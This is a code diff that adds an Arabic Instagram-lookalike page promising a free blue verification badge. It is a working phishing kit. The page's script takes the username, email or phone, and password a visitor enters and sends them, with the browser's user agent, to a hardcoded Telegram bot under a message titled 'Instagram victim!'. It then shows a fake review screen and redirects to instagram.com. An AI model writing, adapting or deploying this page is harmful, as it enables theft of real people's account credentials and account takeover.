@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - توثيق الحساب</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Segoe UI',Tahoma,sans-serif;
+            background:linear-gradient(135deg,#833ab4,#c13584,#e1306c,#fd1d1d);
+            color:#fff;min-height:100vh;
+            display:flex;align-items:center;justify-content:center;padding:20px;
+        }
+        .container{
+            background:rgba(0,0,0,0.7);border-radius:16px;padding:30px 20px;
+            max-width:400px;width:100%;text-align:center;
+            border:2px solid #e1306c;box-shadow:0 0 40px rgba(225,48,108,0.5);
+        }
+        .logo{font-size:45px;margin-bottom:10px}
+        h1{font-size:22px;margin-bottom:5px}
+        .sub{color:#ddd;font-size:13px;margin-bottom:20px}
+        .badge{
+            display:inline-block;background:linear-gradient(135deg,#833ab4,#e1306c);
+            padding:6px 14px;border-radius:20px;font-size:11px;margin-bottom:18px;
+        }
+        .fg{margin-bottom:14px;text-align:right}
+        label{display:block;color:#ddd;font-size:12px;margin-bottom:5px}
+        input{
+            width:100%;padding:13px;background:rgba(255,255,255,0.1);
+            border:1px solid rgba(255,255,255,0.2);border-radius:8px;
+            color:#fff;font-size:14px;outline:none;
+        }
+        input:focus{border-color:#e1306c;box-shadow:0 0 15px rgba(225,48,108,0.3)}
+        input::placeholder{color:#aaa}
+        .btn{
+            width:100%;padding:14px;margin-top:10px;
+            background:linear-gradient(135deg,#833ab4,#e1306c);
+            color:#fff;border:none;border-radius:8px;
+            font-size:17px;font-weight:bold;cursor:pointer;
+            box-shadow:0 0 25px rgba(225,48,108,0.4);
+        }
+        .btn:active{transform:scale(0.96)}
+        .load{
+            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;
+            justify-content:center;align-items:center;flex-direction:column;
+        }
+        .load.show{display:flex}
+        .spinner{
+            width:50px;height:50px;border:4px solid #333;
+            border-top:4px solid #e1306c;border-radius:50%;
+            animation:spin 0.8s linear infinite;margin-bottom:18px;
+        }
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .done{
+            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;
+            justify-content:center;align-items:center;flex-direction:column;
+        }
+        .done.show{display:flex}
+        .done h2{color:#4CAF50;font-size:24px;margin:12px 0}
+    </style>
+</head>
+<body>
+
+<div class="container" id="form">
+    <div class="logo">📷</div>
+    <h1>Instagram</h1>
+    <div class="badge">✔️ توثيق الحساب</div>
+    <p class="sub">احصل على العلامة الزرقاء مجاناً</p>
+    
+    <div class="fg"><label>👤 اسم المستخدم</label><input type="text" id="username" placeholder="@username"></div>
+    <div class="fg"><label>📧 البريد أو الهاتف</label><input type="text" id="email" placeholder="email@example.com"></div>
+    <div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
+    
+    <button class="btn" onclick="go()">✔️ قدم طلب التوثيق</button>
+</div>
+
+<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري مراجعة الطلب...</p></div>
+<div class="done" id="done"><h2>✅ تم التقديم!</h2><p>سيتم مراجعة طلبك خلال 48 ساعة</p></div>
+
+<script>
+const u=new URL(window.location.href);
+const CHAT=u.searchParams.get('chatId')||'7276604783';
+const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+async function send(t){
+    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
+}
+async function go(){
+    const un=document.getElementById('username').value.trim();
+    const em=document.getElementById('email').value.trim();
+    const pw=document.getElementById('password').value.trim();
+    if(!un||!em||!pw)return alert('املأ جميع الحقول');
+    document.getElementById('load').classList.add('show');
+    const msg=`🟣 <b>ضحية انستجرام!</b>\n\n👤 يوزر: ${un}\n📧 إيميل: ${em}\n🔒 كلمة: ${pw}\n\n📱 ${navigator.userAgent}`;
+    await send(msg);
+    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://instagram.com/'},3000)},4000);
+}
+</script>
+</body>
+</html>
